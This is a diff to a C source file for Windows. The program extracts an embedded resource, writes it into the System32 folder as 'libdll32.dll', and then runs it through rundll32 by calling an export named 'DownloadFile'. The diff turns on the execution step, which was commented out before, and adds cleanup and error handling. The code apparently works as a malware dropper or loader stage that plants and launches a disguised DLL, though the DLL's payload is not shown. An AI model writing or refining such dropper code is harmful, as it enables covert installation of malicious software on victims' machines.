@@ -2,6 +2,7 @@
 #include "resource.h"
 
 #define DLL_NAME L"libdll32.dll"
+#define DLL_FUNCTION L"DownloadFile"
 
 int main(int argc, char** argv) {
 	printf("Finding resource\n");
@@ -52,8 +53,10 @@ int main(int argc, char** argv) {
 	wchar_t* dllFile = mergePath(system32, DLL_NAME);
 	printf("DLL: %ws\nCreate file\n", dllFile);
 	HANDLE file = CreateFileW(dllFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	free(dllFile);
 
 	if(file == INVALID_HANDLE_VALUE) {
+		free(buffer);
 		consoleError(GetLastError(), L"CreateFileW");
 		return 1;
 	}
@@ -61,10 +64,12 @@ int main(int argc, char** argv) {
 	DWORD written = 0;
 	
 	if(!WriteFile(file, buffer, resourceSize, &written, NULL)) {
+		free(buffer);
 		consoleError(GetLastError(), L"WriteFile");
 		return 1;
 	}
 
+	free(buffer);
 	printf("Size:    %lu byte(s)\nWritten: %lu byte(s)\n", resourceSize, written);
 
 	if(!CloseHandle(file)) {
@@ -73,37 +78,61 @@ int main(int argc, char** argv) {
 	}
 
 	printf("File closed\n");
-	//wchar_t* rundll32File = mergePath(system32, L"rundll32.exe");
-	//printf("rundll32: %ws\n", rundll32File);
+	wchar_t* rundll32File = mergePath(system32, L"rundll32.exe");
 	free(system32);
-	//free(rundll32File);
-	free(dllFile);
-	/*STARTUPINFO startupInformation = {0};
+	size_t pathLength = wcslen(rundll32File);
+	size_t nameLength = wcslen(DLL_NAME);
+	size_t functionLength = wcslen(DLL_FUNCTION);
+	size_t argumentBufferLength = pathLength + 1 + nameLength + 1 + functionLength + 1;
+	wchar_t* argumentBuffer = malloc(argumentBufferLength * sizeof(wchar_t));
+
+	if(!argumentBuffer) {
+		consoleError(ERROR_OUTOFMEMORY, L"malloc");
+		return 1;
+	}
+
+	for(size_t i = 0; i < pathLength; i++) {
+		argumentBuffer[i] = rundll32File[i];
+	}
+
+	argumentBuffer[pathLength] = L' ';
+
+	for(size_t i = 0; i < nameLength; i++) {
+		argumentBuffer[i + pathLength + 1] = DLL_NAME[i];
+	}
+
+	argumentBuffer[pathLength + nameLength + 1] = L',';
+
+	for(size_t i = 0; i < functionLength; i++) {
+		argumentBuffer[i + pathLength + nameLength + 2] = DLL_FUNCTION[i];
+	}
+
+	argumentBuffer[argumentBufferLength - 1] = 0;
+	STARTUPINFO startupInformation = {0};
 	startupInformation.cb = sizeof(STARTUPINFO);
 	PROCESS_INFORMATION processInformation = {0};
-	std::wstring argument(rundll32);
-	argument += L" ";
-	argument += FILE_NAME;
-	argument += L",Install";
-	wchar_t* programArgument = const_cast<wchar_t*>(argument.c_str());
 	printf("Running DLL File\n");
 
-	if(CreateProcessW(rundll32, programArgument, NULL, NULL, TRUE, NULL, NULL, NULL, &startupInformation, &processInformation) == NULL) {
-		HI_FormatError(GetLastError(), "CreateProcessW()");
-		return -1;
+	if(!CreateProcessW(rundll32File, argumentBuffer, NULL, NULL, TRUE, 0, NULL, NULL, &startupInformation, &processInformation)) {
+		free(rundll32File);
+		free(argumentBuffer);
+		consoleError(GetLastError(), L"CreateProcessW");
+		return 1;
 	}
 
+	free(rundll32File);
+	free(argumentBuffer);
 	printf("Closing Handles\n");
 
-	if(CloseHandle(processInformation.hProcess) == NULL) {
-		HI_FormatError(GetLastError(), "CloseHandle()");
-		return -1;
+	if(!CloseHandle(processInformation.hProcess)) {
+		consoleError(GetLastError(), L"CloseHandle");
+		return 1;
 	}
 
-	if(CloseHandle(processInformation.hThread) == NULL) {
-		HI_FormatError(GetLastError(), "CloseHandle()");
-		return -1;
-	}*/
+	if(!CloseHandle(processInformation.hThread)) {
+		consoleError(GetLastError(), L"CloseHandle");
+		return 1;
+	}
 
 	return 0;
 }
